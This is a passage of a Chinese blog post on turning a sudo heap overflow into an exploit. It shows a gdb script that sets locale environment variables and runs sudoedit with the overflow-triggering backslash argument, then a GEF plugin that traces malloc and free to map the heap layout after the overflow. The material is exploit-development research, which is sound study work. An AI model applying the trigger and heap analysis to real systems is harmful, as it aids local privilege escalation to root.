<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">set breakpoint pending on</span><br><span class="line">set environment LOCPATH = HEAP0</span><br><span class="line">set environment LC_ALL = HEAP1</span><br><span class="line">set environment LC_IDENTIFICATION = HEAP2</span><br><span class="line">set environment LANG = HEAP3</span><br><span class="line">set environment LC_MEASUREMENT = HEAP4</span><br><span class="line">set environment LC_TELEPHONE = HEAP5</span><br><span class="line">set environment LC_ADDRESS = HEAP6</span><br><span class="line">set environment LC_NAME = HEAP7</span><br><span class="line">set environment LC_PAPER = HEAP8</span><br><span class="line">set environment LC_MESSAGES = HEAP9</span><br><span class="line">set environment LC_MONETARY = HEAPA</span><br><span class="line">set environment LC_COLLATE = HEAPB</span><br><span class="line">set environment LC_TIME = HEAPC</span><br><span class="line">set environment LC_NUMERIC = HEAPD</span><br><span class="line">set environment LC_CTYPE = HEAPE</span><br><span class="line">set environment GCONV_PATH = HEAPF</span><br><span class="line">set environment TZ = HEAPG</span><br><span class="line">set environment SHELL = HEAPI</span><br><span class="line"></span><br><span class="line">break free</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> printf &quot;free(): %s\n&quot;,$rdi</span><br><span class="line"> continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/465ccd9c3a880d07af8a9a78aba2a03d.png" alt="image-20220415125938308" /></p>
<p>所以可以从这些地方下手来构建更好的暴力测试工具，同时作者也在第一份暴力测试工具中犯了很多错误。用github上的改进版本能快速找到能利用的点</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/14cd70c46596227d77bdee90d7be5605.png" alt="image-20220415131006033" /></p>
<p>或许利用点在于覆写环境变量？</p>
<h2 id="阶段-3"><a class="markdownIt-Anchor" href="#阶段-3"></a> 阶段 3</h2>
<p>这时里exp还很远，也可以尝试下分析堆溢出过后还有哪些地方申请</p>
<p>作者直接写了一个gef的拓展工具</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit</span></span><br><span class="line"></span><br><span class="line">__AUTHOR__ = <span class="string">&quot;liveoverflow&quot;</span></span><br><span class="line">__VERSION__ = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># persist &quot;database&quot; to the file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">j</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/malloc.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(json.dumps(j))</span><br><span class="line"></span><br><span class="line"><span class="comment"># load &quot;database&quot; from the file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/malloc.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        j = json.loads(f.read())</span><br><span class="line">    <span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="comment"># handler for malloc() breakpoints</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MallocBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(MallocBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line">        self.size = <span class="literal">None</span></span><br><span class="line">        self.addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># malloc() breakpoint triggered</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        log = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># extract information about this malloc()</span></span><br><span class="line">        log[<span class="string">&quot;size&quot;</span>] = get_register(<span class="string">&quot;$rdi&quot;</span>)</span><br><span class="line">        log[<span class="string">&quot;rip&quot;</span>] = get_register(<span class="string">&quot;$rip&quot;</span>)</span><br><span class="line">        log[<span class="string">&quot;backtrace&quot;</span>] = gdb.execute(<span class="string">&#x27;bt&#x27;</span>, to_string=<span class="literal">True</span>)</span><br><span class="line">        log[<span class="string">&#x27;name&#x27;</span>] = gdb.newest_frame().older().name()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># set a breakpoint at the malloc() return</span></span><br><span class="line">        <span class="keyword">if</span> log[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">and</span> <span class="string">&#x27;set_cmnd&#x27;</span> <span class="keyword">in</span> log[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            self.retbp = MallocReturnBreakpoint(log=log, overwrite=gdb.newest_frame().older())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        self.retbp = MallocReturnBreakpoint(log=log)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># breakpoint for the return of a malloc()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MallocReturnBreakpoint</span>(gdb.FinishBreakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, log, overwrite=<span class="literal">False</span>, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> overwrite:</span><br><span class="line">            overwrite = gdb.newest_frame()</span><br><span class="line">        <span class="built_in">super</span>(MallocReturnBreakpoint, self).__init__(overwrite, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">False</span></span><br><span class="line">        self.log = log</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># extract some information</span></span><br><span class="line">        self.log[<span class="string">&#x27;addr&#x27;</span>] = get_register(<span class="string">&quot;$rax&quot;</span>)</span><br><span class="line">        self.log[<span class="string">&#x27;name&#x27;</span>] = gdb.newest_frame().name()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># load the mallocs() we logged before</span></span><br><span class="line">        MALLOCS = load()</span><br><span class="line">        <span class="comment"># add this malloc to the known allocations</span></span><br><span class="line">        MALLOCS[<span class="built_in">str</span>(self.log[<span class="string">&#x27;addr&#x27;</span>])] = self.log</span><br><span class="line">        dump(MALLOCS)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># this is the location of our overflowing buffer</span></span><br><span class="line">        <span class="comment"># now we can dump the heap analysis</span></span><br><span class="line">        <span class="keyword">if</span> self.log[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">and</span> <span class="string">&#x27;set_cmnd&#x27;</span> <span class="keyword">in</span> self.log[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;YYYYYYYYYYY WE ARE IN!!!&quot;</span>)</span><br><span class="line">            addr = get_register(<span class="string">&quot;$rax&quot;</span>)</span><br><span class="line">            mallocs = [<span class="built_in">int</span>(a) <span class="keyword">for</span> a <span class="keyword">in</span> MALLOCS]</span><br><span class="line">            mallocs.sort()</span><br><span class="line">            SHOW = <span class="number">5</span></span><br><span class="line">            out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> mall <span class="keyword">in</span> mallocs:</span><br><span class="line">                <span class="keyword">if</span> mall &gt; addr <span class="keyword">and</span> SHOW&gt;<span class="number">0</span>:</span><br><span class="line">                    h = MALLOCS[<span class="built_in">str</span>(mall)]</span><br><span class="line">                    <span class="keyword">for</span> line <span class="keyword">in</span> h[<span class="string">&#x27;backtrace&#x27;</span>].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:]:</span><br><span class="line">                        <span class="keyword">if</span> line:</span><br><span class="line">                            l = line.split()</span><br><span class="line">                            <span class="built_in">print</span>(l)</span><br><span class="line">                            <span class="keyword">if</span> l[<span class="number">3</span>] != <span class="string">&#x27;??&#x27;</span>:</span><br><span class="line">                                out += (l[<span class="number">3</span>]) + <span class="string">&quot; &quot;</span></span><br><span class="line">                    out += <span class="string">&quot;\n&quot;</span></span><br><span class="line">                    SHOW -= <span class="number">1</span></span><br><span class="line">            out += <span class="string">&quot;\n&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(out)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/heap&#x27;</span> ,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(out)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a breakpoint on free()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FreeBreakpoint</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location, *args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>(FreeBreakpoint, self).__init__(location, gdb.BP_BREAKPOINT, internal=<span class="literal">False</span>)</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line">        self.size = <span class="literal">None</span></span><br><span class="line">        self.malloc = []</span><br><span class="line">        self.addr = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        log = &#123;&#125;</span><br><span class="line">        log[<span class="string">&quot;addr&quot;</span>] = get_register(<span class="string">&quot;$rdi&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if the memory freed was allocated before</span></span><br><span class="line">        MALLOCS = load()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(log[<span class="string">&quot;addr&quot;</span>]) <span class="keyword">in</span> MALLOCS:</span><br><span class="line">            <span class="comment"># remove this object from the list of allocated objects</span></span><br><span class="line">            <span class="keyword">del</span> MALLOCS[<span class="built_in">str</span>(log[<span class="string">&quot;addr&quot;</span>])]</span><br><span class="line">            dump(MALLOCS)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the gdb command that starts the heap trace</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SudoeditCommand</span>(<span class="title class_ inherited__">GenericCommand</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Tracks a function given in parameter for arguments and return code.&quot;&quot;&quot;</span></span><br><span class="line">    _cmdline_ = <span class="string">&quot;sudoedit&quot;</span></span><br><span class="line">    _syntax_ = <span class="string">f&quot;<span class="subst">&#123;_cmdline_&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_invoke</span>(<span class="params">self, args</span>):</span><br><span class="line">        dump(&#123;&#125;)</span><br><span class="line">        self.bkps = []</span><br><span class="line">        <span class="comment"># set the breakpoints</span></span><br><span class="line">        self.bkps.append(MallocBreakpoint(location=<span class="string">&quot;__libc_malloc&quot;</span>))</span><br><span class="line">        self.bkps.append(FreeBreakpoint(location=<span class="string">&quot;__libc_free&quot;</span>))</span><br><span class="line">        <span class="comment">#self.bkps.append(MallocBreakpoint(location=&quot;malloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(ReallocBreakpoint(location=&quot;__libc_calloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(ReallocBreakpoint(location=&quot;__libc_realloc&quot;))</span></span><br><span class="line">        <span class="comment">#self.bkps.append(FreeBreakpoint(location=&quot;free&quot;))</span></span><br><span class="line"></span><br><span class="line">        gdb.events.exited.connect(self.cleanup)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cleanup</span>(<span class="params">self, events</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;CLEANUP!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> bp <span class="keyword">in</span> self.bkps:</span><br><span class="line">            bp.delete()</span><br><span class="line">        gdb.events.exited.disconnect(self.cleanup)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    register_external_command(SudoeditCommand())</span><br></pre></td></tr></table></figure>
<p>设置插件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef2&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit</span><br></pre></td></tr></table></figure>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex &#x27;set breakpoint pending on&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;r -s xxxxxxxxxxxxxxxxxx&#x27; -ex &#x27;sudoedit&#x27; -ex &#x27;continue&#x27; /usr/local/bin/sudoedit | tee heap.log</span><br></pre></td></tr></table></figure>
<p>主要就是跟踪<code>malloc</code>和<code>free</code>在堆溢出之后的行为</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e672b987fc044881b8c2552c9cf2fb30.png" alt="image-20220415204128487" /></p>
<p>只有将这个改写到暴力脚本里面，找到符合条件的Chunk</p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2022/06/10/windbg-note/">prev_post</a><a class="pagination__link pagination__next" href="/2022/04/13/sudo-fuzz2exp-2/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>